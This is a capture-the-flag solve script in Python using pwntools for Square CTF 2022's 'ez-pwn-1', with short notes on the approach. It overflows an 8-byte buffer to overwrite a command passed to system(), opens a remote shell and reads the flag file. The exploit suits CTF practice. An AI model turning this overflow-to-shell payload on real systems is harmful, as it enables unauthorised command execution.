""" Solution

    Ez challenge to start off with, just need to overflow the first 8 byte buffer, to control the command buffer that gets system called

    """

""" Post Mortem
    
    Read a bit slower, went gunz blazing too early on
    Also have the pwntools boilerplate stuff ready
    """


from pwn import *

HOST = 'chals.2022.squarectf.com'
PORT = 4100

context.arch = 'amd64'
context.binary = './ez-pwn-1'
context.terminal = ['gnome-terminal', '-x', 'sh', '-c']

def get_proc():
  #proc = process()
  proc = remote(HOST, PORT)

  return proc

def attach_gdb(proc):
  gdb.attach(proc, gdbscript="""

  """)

def main():
  proc = get_proc()

  payload = b''.join([
    b'A' * 8,
    b'sh\x00'
  ])

  proc.sendlineafter(b'Hi! would you like me to ls the current directory?', payload)
  proc.interactive()
  proc.sendlineafter(b'Ok, here ya go!', b'cat the_flag_is_in_here')
  print(proc.readline())
  print(proc.readline())
  print(proc.readline())
  proc.interactive()


if __name__ == '__main__':
  main()
